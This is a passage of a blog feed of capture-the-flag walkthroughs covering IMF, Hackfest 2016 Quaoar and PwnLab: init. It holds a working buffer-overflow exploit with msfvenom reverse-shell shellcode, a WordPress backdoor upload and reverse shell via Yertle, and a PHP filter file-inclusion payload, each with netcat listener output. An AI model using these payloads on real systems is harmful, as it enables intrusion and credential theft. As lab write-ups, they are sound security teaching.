<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'>
</span><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'>
</span><span class='line'><span class="n">target</span> <span class="o">=</span> <span class="s">&quot;192.168.145.130&quot;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">7788</span>
</span><span class='line'><span class="n">agentid</span> <span class="o">=</span> <span class="s">&quot;48093572</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">menu</span> <span class="o">=</span> <span class="s">&quot;3</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.145.129 LPORT=8888 -f python -o killagent.py -# b &quot;\x00\x0a\x0d&quot;</span>
</span><span class='line'><span class="c"># Size: 95 bytes</span>
</span><span class='line'>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span>  <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xbb\x6e\x01\x4b\xcb\xdb\xcc\xd9\x74\x24\xf4\x5e\x31</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xc9\xb1\x12\x31\x5e\x12\x03\x5e\x12\x83\xa8\x05\xa9</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x3e\x05\xdd\xda\x22\x36\xa2\x77\xcf\xba\xad\x99\xbf</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xdc\x60\xd9\x53\x79\xcb\xe5\x9e\xf9\x62\x63\xd8\x91</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xb4\x3b\x8b\xe0\x5d\x3e\xac\xc0\x25\xb7\x4d\xb4\x30</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x98\xdc\xe7\x0f\x1b\x56\xe6\xbd\x9c\x3a\x80\x53\xb2</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xc9\x38\xc4\xe3\x02\xda\x7d\x75\xbf\x48\x2d\x0c\xa1</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xdc\xda\xc3\xa2</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">offset</span> <span class="o">=</span> <span class="mi">168</span>
</span><span class='line'><span class="n">call</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x63\x85\x04\x08</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">nop</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">pad</span> <span class="o">=</span> <span class="n">nop</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="c"># 73 bytes</span>
</span><span class='line'>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="n">pad</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="n">call</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">agentid</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">menu</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Payload sent. Check your listener.&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And what remains is to execute it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python agentkill.py 
</span><span class='line'>Payload sent. Check your listener.</span></code></pre></td></tr></table></div></figure>


<p>And on the listener, mission accomplished!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.145.129] from (UNKNOWN) [192.168.145.130] 58634
</span><span class='line'>whoami
</span><span class='line'>root
</span><span class='line'>ls /root
</span><span class='line'>Flag.txt
</span><span class='line'>TheEnd.txt
</span><span class='line'>cat Flag.txt
</span><span class='line'>flag6{R2gwc3RQcm90MGMwbHM=}
</span><span class='line'>cat TheEnd.txt
</span><span class='line'>   ____                        _ __   __   
</span><span class='line'>  /  _/_ _  ___  ___  ___ ___ (_) /  / /__ 
</span><span class='line'> _/ //  ' \/ _ \/ _ \(_-&lt;(_-&lt;/ / _ \/ / -_)
</span><span class='line'>/___/_/_/_/ .__/\___/___/___/_/_.__/_/\__/ 
</span><span class='line'>   __  __/_/        _                      
</span><span class='line'>  /  |/  (_)__ ___ (_)__  ___              
</span><span class='line'> / /|_/ / (_-&lt;(_-&lt;/ / _ \/ _ \             
</span><span class='line'>/_/__/_/_/___/___/_/\___/_//_/             
</span><span class='line'>  / __/__  ___________                     
</span><span class='line'> / _// _ \/ __/ __/ -_)                    
</span><span class='line'>/_/  \___/_/  \__/\__/                     
</span><span class='line'>                                           
</span><span class='line'>Congratulations on finishing the IMF Boot2Root CTF. I hope you enjoyed it.
</span><span class='line'>Thank you for trying this challenge and please send any feedback.
</span><span class='line'>
</span><span class='line'>Geckom
</span><span class='line'>Twitter: @g3ck0ma
</span><span class='line'>Email: geckom@redteamr.com
</span><span class='line'>Web: http://redteamr.com
</span><span class='line'>
</span><span class='line'>Special Thanks
</span><span class='line'>Binary Advice: OJ (@TheColonial) and Justin Stevens (@justinsteven)
</span><span class='line'>Web Advice: Menztrual (@menztrual)
</span><span class='line'>Testers: dook (@dooktwit), Menztrual (@menztrual), llid3nlq and OJ(@TheColonial)</span></code></pre></td></tr></table></div></figure>


<p>And the final decoded flag is <code>Gh0stProt0c0ls</code>! This was a really nice challenge in the later stages, especially from flag 3 onwards! Hats off to Geckom and the collaborators for this interesting VM!</p>

<p>As a recap, from only a web server available to root:</p>

<ul>
<li>HTML source &ndash;> JS included files &ndash;> PHP function exploitation &ndash;> SQLi &ndash;> directory bruteforcing &ndash;> PHP shell upload &ndash;> binary exploitation &ndash;> root</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ It is by the fortune of God that, in   \
</span><span class='line'>| this country, we have three benefits:  |
</span><span class='line'>| freedom of speech, freedom of thought, |
</span><span class='line'>| and the wisdom never to use either.    |
</span><span class='line'>|                                        |
</span><span class='line'>\ -- Mark Twain                          /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackfest 2016: Quaoar]]></title>
    <link href="http://chousensha.github.io/blog/2018/09/21/hackfest-2016-quaoar/"/>
    <updated>2018-09-21T10:37:53-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/09/21/hackfest-2016-quaoar</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target was created for the Hackfest 2016 CTF. The goal is to become root and get a flag on the machine.</p>

<!-- more -->


<p>Nmap shows SSH, Samba, a web server and mail services running on the target:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE SERVICE     VERSION
</span><span class='line'>22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
</span><span class='line'>|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
</span><span class='line'>|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
</span><span class='line'>53/tcp  open  domain      ISC BIND 9.8.1-P1
</span><span class='line'>| dns-nsid: 
</span><span class='line'>|_  bind.version: 9.8.1-P1
</span><span class='line'>80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
</span><span class='line'>| http-robots.txt: 1 disallowed entry 
</span><span class='line'>|_Hackers
</span><span class='line'>|_http-server-header: Apache/2.2.22 (Ubuntu)
</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
</span><span class='line'>110/tcp open  pop3        Dovecot pop3d
</span><span class='line'>|_pop3-capabilities: RESP-CODES SASL STLS CAPA UIDL PIPELINING TOP
</span><span class='line'>| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
</span><span class='line'>| Not valid before: 2016-10-07T04:32:43
</span><span class='line'>|_Not valid after:  2026-10-07T04:32:43
</span><span class='line'>|_ssl-date: 2018-09-21T14:42:41+00:00; 0s from scanner time.
</span><span class='line'>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</span><span class='line'>143/tcp open  imap        Dovecot imapd
</span><span class='line'>|_imap-capabilities: post-login have more capabilities Pre-login LOGINDISABLEDA0001 LITERAL+ listed ENABLE OK LOGIN-REFERRALS ID STARTTLS IMAP4rev1 IDLE SASL-IR
</span><span class='line'>| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
</span><span class='line'>| Not valid before: 2016-10-07T04:32:43
</span><span class='line'>|_Not valid after:  2026-10-07T04:32:43
</span><span class='line'>|_ssl-date: 2018-09-21T14:42:41+00:00; 0s from scanner time.
</span><span class='line'>445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
</span><span class='line'>993/tcp open  ssl/imap    Dovecot imapd
</span><span class='line'>|_imap-capabilities: post-login more capabilities Pre-login have LITERAL+ listed ENABLE OK LOGIN-REFERRALS ID AUTH=PLAINA0001 IMAP4rev1 IDLE SASL-IR
</span><span class='line'>| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
</span><span class='line'>| Not valid before: 2016-10-07T04:32:43
</span><span class='line'>|_Not valid after:  2026-10-07T04:32:43
</span><span class='line'>|_ssl-date: 2018-09-21T14:42:41+00:00; +1s from scanner time.
</span><span class='line'>995/tcp open  ssl/pop3    Dovecot pop3d
</span><span class='line'>| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
</span><span class='line'>| Not valid before: 2016-10-07T04:32:43
</span><span class='line'>|_Not valid after:  2026-10-07T04:32:43
</span><span class='line'>|_ssl-date: 2018-09-21T14:42:40+00:00; +1s from scanner time.</span></code></pre></td></tr></table></div></figure>


<p>On the web server there are some pictures with planets and the message &ldquo;Hack The Planet&rdquo;. But there are entries in robots.txt:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Disallow: Hackers
</span><span class='line'>Allow: /wordpress/
</span><span class='line'>   ____                              
</span><span class='line'>#  /___ \_   _  __ _  ___   __ _ _ __ 
</span><span class='line'># //  / / | | |/ _` |/ _ \ / _` | '__|
</span><span class='line'>#/ \_/ /| |_| | (_| | (_) | (_| | |   
</span><span class='line'>#\___,_\ \__,_|\__,_|\___/ \__,_|_|  </span></code></pre></td></tr></table></div></figure>


<p>No directory called hackers but there is a Wordpress blog :p</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/quaoar/quaoar_blog.png" title="wordpress" alt="wordpress blog"></p>

<p>Naturally, I ran Wpscan, and it found 2 usernames:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] Enumerating usernames ...
</span><span class='line'>[+] We identified the following 2 users:
</span><span class='line'>    +----+--------+--------+
</span><span class='line'>    | ID | Login  | Name   |
</span><span class='line'>    +----+--------+--------+
</span><span class='line'>    | 1  | admin  | admin  |
</span><span class='line'>    | 2  | wpuser | wpuser |
</span><span class='line'>    +----+--------+--------+</span></code></pre></td></tr></table></div></figure>


<p>A prelimiary check for default credentials actually revealed the password for the admin user is..you will never guess it..admin! For receiving a shell, I wanted to try a new tool: <a href="https://github.com/n00py/WPForce">WPForce</a>!</p>

<blockquote><p>WPForce is a suite of Wordpress Attack tools. Currently this contains 2 scripts &ndash; WPForce, which
brute forces logins via the API, and Yertle, which uploads shells once admin credentials have been
found. Yertle also contains a number of post exploitation modules.</p></blockquote>

<p>I used the <code>yertle.py</code> script to upload a backdoor:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python yertle.py -u "admin" -p "admin" -t "http://192.168.217.145/wordpress" -i
</span><span class='line'>     _..---.--.    __   __        _   _
</span><span class='line'>   .'\ __|/O.__)   \ \ / /__ _ __| |_| | ___
</span><span class='line'>  /__.' _/ .-'_\    \ V / _ \ '__| __| |/ _ \.
</span><span class='line'> (____.'.-_\____)    | |  __/ |  | |_| |  __/
</span><span class='line'>  (_/ _)__(_ \_)\_   |_|\___|_|   \__|_|\___|
</span><span class='line'>   (_..)--(.._)'--'         ~n00py~
</span><span class='line'>      Post-exploitation Module for Wordpress
</span><span class='line'>                     v.1.1.0
</span><span class='line'>    
</span><span class='line'>Backdoor uploaded!
</span><span class='line'>Upload Directory: cpucqjc
</span><span class='line'>os-shell&gt; whoami
</span><span class='line'>Sent command: whoami
</span><span class='line'>www-data
</span><span class='line'>os-shell&gt; pwd
</span><span class='line'>Sent command: pwd
</span><span class='line'>/var/www/wordpress/wp-content/plugins/cpucqjc</span></code></pre></td></tr></table></div></figure>


<p>Time to snoop around! I was able to read <code>/var/www/wordpress/wp-config.php</code> and inside found credentials for the SQL database:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/** MySQL database username */
</span><span class='line'>define('DB_USER', 'root');
</span><span class='line'>
</span><span class='line'>/** MySQL database password */
</span><span class='line'>define('DB_PASSWORD', 'rootpassword!');</span></code></pre></td></tr></table></div></figure>


<p>I also found a flag inside <em>wpadmin</em>&rsquo;s home directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>os-shell&gt; cat /home/wpadmin/flag.txt
</span><span class='line'>Sent command: cat /home/wpadmin/flag.txt
</span><span class='line'>2bafe61f03117ac66a73c3c514de796e</span></code></pre></td></tr></table></div></figure>


<p>I found the shell I had pretty restrictive so I used Yertle to get a reverse shell that I could upgrade:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>os-shell&gt; shell
</span><span class='line'>IP Address: 192.168.217.132
</span><span class='line'>Port: 8888
</span><span class='line'>Sending reverse shell to 192.168.217.132 port 8888</span></code></pre></td></tr></table></div></figure>


<p>And on my listener side:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -lnvp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.145] 50713
</span><span class='line'>bash: no job control in this shell
</span><span class='line'>www-data@Quaoar:/var/www/wordpress/wp-content/plugins/cpucqjc$ </span></code></pre></td></tr></table></div></figure>


<p>I used Python to spawn a TTY and then I tried the root credentials for a pleasant surprise. They are the actual credentials of the root user!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@Quaoar:~# cat /root/flag.txt
</span><span class='line'>8e3f9ec016e3598c5eec11fd3d73f6fb</span></code></pre></td></tr></table></div></figure>


<p>And that was it for this challenge!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> __________________________________
</span><span class='line'>/ Be cheerful while you are alive. \
</span><span class='line'>|                                  |
</span><span class='line'>\ -- Phathotep, 24th Century B.C.  /
</span><span class='line'> ----------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pwnlab: init]]></title>
    <link href="http://chousensha.github.io/blog/2018/08/25/pwnlab-init/"/>
    <updated>2018-08-25T17:01:13-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/08/25/pwnlab-init</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s boot2root is called PwnLab: init and the goal is to read the flag in /root/flag.txt</p>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Nmap scan report for 192.168.164.129
</span><span class='line'>Host is up (0.00099s latency).
</span><span class='line'>Not shown: 65531 closed ports
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
</span><span class='line'>|_http-server-header: Apache/2.4.10 (Debian)
</span><span class='line'>|_http-title: PwnLab Intranet Image Hosting
</span><span class='line'>111/tcp   open  rpcbind 2-4 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100024  1          37397/udp  status
</span><span class='line'>|_  100024  1          58026/tcp  status
</span><span class='line'>3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
</span><span class='line'>| mysql-info: 
</span><span class='line'>|   Protocol: 10
</span><span class='line'>|   Version: 5.5.47-0+deb8u1
</span><span class='line'>|   Thread ID: 38
</span><span class='line'>|   Capabilities flags: 63487
</span><span class='line'>|   Some Capabilities: InteractiveClient, LongColumnFlag, FoundRows, SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsTransactions, LongPassword, Support41Auth, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, ODBCClient, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
</span><span class='line'>|   Status: Autocommit
</span><span class='line'>|   Salt: pKc2lJniDVf|]&lt;Rg2bwQ
</span><span class='line'>|_  Auth Plugin Name: 88
</span><span class='line'>58026/tcp open  status  1 (RPC #100024)</span></code></pre></td></tr></table></div></figure>


<p>The website is an intranet portal for uploading images, but we have to login first.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pwnlab_init/web.jpg" title="web server" alt="intranet portal"></p>

<p>I ran Nikto on it but there were no interesting finds, except for the following line:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+ /config.php: PHP Config file may contain database IDs and passwords.</span></code></pre></td></tr></table></div></figure>


<p>However, when I tried to read that file, all I got was a blank page. I&rsquo;ve noticed that the URLs for the pages look like this: <a href="http://192.168.164.129/?page=login">http://192.168.164.129/?page=login</a> for the login page and <a href="http://192.168.164.129/?page=upload">http://192.168.164.129/?page=upload</a> for the upload page. I tried some directory traversal and file inclusion techniques, thinking that this might be the way of reading the config.php file, but had no luck. However, as I was searching for a way on the internet, I came across this article on a <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/">LFI method that uses PHP filters</a>. The below command allows reading the source of PHP files by using the filter functionality to base64 encode the contents of the file before reading it:</p>

<p><code>url?page=php://filter/convert.base64-encode/resource=config</code></p>

<p>This returned a base64 string that when decoded, gave me the MySQL credentials:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
</span><span class='line'>$server     = "localhost";
</span><span class='line'>$username = "root";
</span><span class='line'>$password = "H4u%QJ_H99";
</span><span class='line'>$database = "Users";
</span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure>


<p>Now we can connect to that database:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql -u root -h 192.168.217.143
</span><span class='line'>ERROR 1045 (28000): Access denied for user 'root'@'192.168.217.132' (using password: NO)
</span><span class='line'>root@kali:~# mysql -u root -p -h 192.168.217.143
</span><span class='line'>Enter password: 
</span><span class='line'>Welcome to the MariaDB monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 41
</span><span class='line'>Server version: 5.5.47-0+deb8u1 (Debian)
</span><span class='line'>
</span><span class='line'>Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.
</span><span class='line'>
</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
</span><span class='line'>
</span><span class='line'>MySQL [(none)]&gt; use Users
</span><span class='line'>Reading table information for completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A
</span><span class='line'>
</span><span class='line'>Database changed
</span><span class='line'>MySQL [Users]&gt;  </span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what we have here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>MySQL [Users]&gt; show tables;
</span><span class='line'>+-----------------+
</span><span class='line'>| Tables_in_Users |
</span><span class='line'>+-----------------+
</span><span class='line'>| users           |
</span><span class='line'>+-----------------+
</span><span class='line'>1 row in set (0.00 sec)
</span><span class='line'>MySQL [Users]&gt; select * from users;
